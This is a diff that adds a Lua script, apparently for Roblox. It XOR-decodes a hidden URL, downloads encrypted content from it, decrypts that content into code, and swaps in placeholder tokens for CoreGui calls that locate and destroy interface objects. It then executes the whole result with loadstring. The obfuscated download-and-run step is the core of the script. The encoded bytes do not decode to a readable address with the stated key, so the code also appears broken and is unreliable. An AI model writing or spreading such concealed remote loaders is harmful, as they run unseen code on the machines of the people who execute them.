@@ -1,0 +1,39 @@
+local SECRET_KEY = 73 
+
+local function decrypt(data)
+    local decrypted = ""
+    for i = 1, #data do
+        decrypted = decrypted .. string.char(bit32.bxor(data[i], SECRET_KEY))
+    end
+    return decrypted
+end
+
+local encrypted_url_data = {35, 23, 23, 27, 26, 124, 38, 38, 5, 14, 22, 117, 34, 18, 5, 27, 26, 25, 26, 26, 32, 21, 54, 38, 33, 27, 34, 21, 33, 117, 38, 26, 36, 118, 34, 39, 39, 43, 118, 26, 24, 26, 37, 118, 36, 22, 26, 33, 118, 35, 22, 26, 34, 117, 26, 21, 22, 26, 117, 43, 10, 27}
+local url = decrypt(encrypted_url_data)
+
+local success, file_content = pcall(function() return game:HttpGet(url) end)
+if success then
+    -- التعديل هنا: المفسر سيقوم بتحويل النص القادم من الموقع إلى مصفوفة (Table)
+    local encrypted_script_table = loadstring("return "..file_content)()
+    
+    -- فك تشفير المصفوفة وجعلها كوداً قابلاً للتشغيل
+    local final_script = decrypt(encrypted_script_table)
+    
+    -- تطبيق قاموس اللغة الجديدة (الاستبدال)
+    local dict = {
+        ["[CORE]"] = "game:GetService('CoreGui')",
+        ["[FIND]"] = "GetDescendants()",
+        ["[TYPE_UI]"] = "IsA('GuiObject')",
+        ["[IMG]"] = "IsA('ImageLabel') or obj:IsA('ImageButton')",
+        ["[TXT]"] = "IsA('TextLabel') or obj:IsA('TextButton')",
+        ["[KILL]"] = "pcall(function() obj:Destroy() end)",
+        ["[GET_IMG]"] = "obj.Image",
+        ["[GET_BG]"] = "obj.BackgroundColor3",
+        ["[GET_TC]"] = "obj.TextColor3"
+    }
+    
+    for k, v in pairs(dict) do final_script = final_script:gsub(k, v) end
+    
+    local run, err = loadstring(final_script)
+    if run then run() else warn("Error:", err) end
+end
